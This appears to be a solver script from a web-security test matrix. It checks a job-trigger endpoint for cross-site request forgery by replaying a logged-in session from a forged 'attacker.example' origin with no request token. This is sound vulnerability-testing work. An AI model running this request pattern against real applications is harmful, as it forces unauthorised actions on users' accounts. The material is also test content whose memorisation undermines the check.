// Cross-site request forgery against the job trigger: replay the authenticated session cookie from a
// foreign origin with no request token, and confirm the job still advances.
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const listRes = await ctx.fetch(ctx.plan.routes.jobList!.path, { method: 'GET' })
  const list = (await listRes.json()) as { items?: Array<{ ext_id: string }> }
  const jobId = list.items?.[0]?.ext_id
  if (!jobId) return
  const path = ctx.plan.routes.jobTrigger!.path.replace(/:[A-Za-z0-9_]+/, jobId)
  await ctx.fetch(path, {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded', origin: 'https://attacker.example' },
    body: '',
  })
}
